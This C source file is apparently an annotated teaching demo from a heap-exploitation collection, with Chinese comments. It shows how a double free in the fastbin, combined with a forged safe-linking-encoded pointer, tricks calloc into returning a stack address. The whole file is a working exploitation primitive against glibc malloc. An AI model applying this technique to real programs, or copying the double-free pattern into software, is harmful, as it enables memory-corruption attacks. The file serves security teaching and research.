#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
	fprintf(stderr, "本文件在fastbin_dup.c的基础上扩展了欺骗malloc使其返回一个指向受控区域的指针，如本例中的返回一个指向栈内存的指针.\n");


	fprintf(stderr,"首先塞满tcache.\n");

	void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}


	unsigned long stack_var[2] __attribute__ ((aligned (0x10)));

	fprintf(stderr, "我们想让malloc()返回的地址是栈上的 %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "malloc三个内存.\n");
	int *a = calloc(1,8);
	int *b = calloc(1,8);
	int *c = calloc(1,8);

	fprintf(stderr, "第一次 calloc(1,8): %p\n", a);
	fprintf(stderr, "第二次 calloc(1,8): %p\n", b);
	fprintf(stderr, "第三次 calloc(1,8): %p\n", c);

	fprintf(stderr, "Free第一个内存...\n"); //First call to free will add a reference to the fastbin
	free(a);

	fprintf(stderr,"如果我们再次free %p, 程序会崩溃，因为 %p 在freelist的第一个.\n", a, a);

	fprintf(stderr,"所以我们来free第二块内存 %p.\n", b);
	free(b);

	//Calling free(a) twice renders the program vulnerable to Double Free

	fprintf(stderr,"现在我们就可以再次free %p 了，因为他不是“上次”释放的内存了.\n", a);
	free(a);

	fprintf(stderr, "现在free list有 [ %p, %p, %p ]. 我们现在通过修改 %p 指向的数据继续攻击.\n", a, b, a, a);
	unsigned long *d = calloc(1,8);

	fprintf(stderr, "第一次 calloc(1,8): %p\n", d);
	fprintf(stderr, "第二次 calloc(1,8): %p\n", calloc(1,8));
	fprintf(stderr, "现在free list有 [ %p ].\n", a);
	fprintf(stderr, "现在我们可以访问到 %p ，同时它还在free list的第一位.\n"
		"所以我们向栈中写入一个伪造的free size (在这里是0x20) ,\n"
		"这样malloc就会认为这里是一个空闲的内存，并且分配一个指向这里的指针\n", a);
	stack_var[1] = 0x20;

	fprintf(stderr, "现在我们复写 %p 指向数据的前8 byte，让他们正好位于0x20之前.\n", a);
	fprintf(stderr, "注意，由于safe linking mechanism，存储的值不是指针，而是poisoned value.\n");
	//fprintf(stderr, "Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.\n");
	//fprintf(stderr, "^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\n");
	unsigned long ptr = (unsigned long)stack_var;
	unsigned long addr = (unsigned long) d;
	/*VULNERABILITY*/
	*d = (addr >> 12) ^ ptr;
	/*VULNERABILITY*/

	fprintf(stderr, "第三次calloc(1,8): %p, 使栈上地址进入free list\n", calloc(1,8));

	void *p = calloc(1,8);

	fprintf(stderr, "第四次 calloc(1,8): %p 这个地址是栈上stack_var + 0x10的地址\n", p);
	assert((unsigned long)p == (unsigned long)stack_var + 0x10);
}
